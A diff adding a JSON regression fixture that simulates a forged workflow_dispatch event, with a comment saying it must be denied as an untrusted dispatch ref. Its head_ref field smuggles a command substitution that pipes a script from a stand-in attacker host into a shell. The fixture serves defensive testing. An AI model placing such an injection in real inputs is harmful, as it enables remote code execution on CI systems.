@@ -1,0 +1,16 @@
+{
+  "_comment": "Regression fixture: a forged workflow_dispatch. The mode is allowlisted and the PR number exists, but head_ref is attacker-controlled text. Denied before any lookup or checkout: untrusted_dispatch_ref. The extra keys mirror what an attacker would try to smuggle through the inputs object.",
+  "ref": "main",
+  "workflow": "opencode.yml",
+  "inputs": {
+    "mode": "resolve-conflict",
+    "pr_number": "3",
+    "head_ref": "opencode/issue12-$(curl attacker.example/x|sh)",
+    "run_id": "",
+    "review_id": "",
+    "extra": "ignored"
+  },
+  "sender": { "login": "untrusted-stranger", "type": "User" },
+  "repository": { "full_name": "kodmial/continuum" },
+  "organization": { "login": "kodmial" }
+}
